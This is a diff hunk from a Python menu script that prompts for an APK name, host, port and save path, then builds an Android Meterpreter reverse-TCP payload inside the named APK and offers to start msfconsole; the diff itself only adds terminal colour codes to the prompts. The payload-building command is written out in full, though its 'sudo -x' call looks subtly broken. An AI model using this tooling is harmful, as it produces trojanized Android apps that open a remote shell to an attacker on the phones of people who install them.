@@ -23,19 +23,19 @@ if x == '1':
 	os.system('python3 UAP.py')
 elif x == '2':
 		os.system('clear')
-		bom = input('name apk : ')
-		host = input('Enter HOST : ')
-		port = input('Enter PORT : ')
-		ba = input('new name  : ')
-		pw = input('save path : ')
-		print('plase wait')
+		bom = input('\033[1;32mname apk : ')
+		host = input('\033[1;37mEnter HOST : ')
+		port = input('\033[1;35mEnter PORT : ')
+		ba = input('\033[1;32mnew name  : ')
+		pw = input('\033[1;36msave path : ')
+		print('\033[1;33mplase wait')
 		os.system('sudo -x '+bom+' -p android/meterpreter/reverse_tcp LHOST='+host+' LPORT='+port+' R> /'+pw+'/'+ba+'.apk')
 		os.system('clear')
-		print('do you run metasploit')
-		va = input('Enter [ n / y ] ○~~> : ')
+		print('\033[1;34mdo you run metasploit')
+		va = input('\033[1;32mEnter [ n / y ] ○~~> : ')
 		if va == 'y':
 			os.system('clear')
-			print('plase wait')
+			print('\033[1;31mplase wait')
 			os.system('msfconsole')
 		else:
 			if va == 'n':
